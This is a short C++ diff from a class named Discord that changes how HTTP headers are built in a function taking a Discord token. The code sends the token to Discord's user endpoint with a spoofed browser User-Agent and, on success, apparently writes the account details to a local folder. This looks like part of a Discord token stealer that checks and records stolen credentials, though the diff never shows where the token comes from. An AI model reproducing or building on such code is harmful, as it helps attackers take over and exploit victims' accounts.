@@ -14,7 +14,11 @@ void Discord::execute(fs::path &root) {
 
 void Discord::writeTokenInfo(const std::string& token, const fs::path& root) {
 
-    std::pair<std::string, int> request = HttpUtil::sendHttpRequest("https://discordapp.com/api/v6/users/@me", "Content-Type: application/json\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\nAuthorization: " + token);
+    std::pair<std::string, int> request = HttpUtil::sendHttpRequest("https://discordapp.com/api/v6/users/@me", {
+            {"Content-Type", "application/json"},
+            {"User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"},
+            {"Authorization", token}
+    });
     if(request.second != 200)
         return;
 
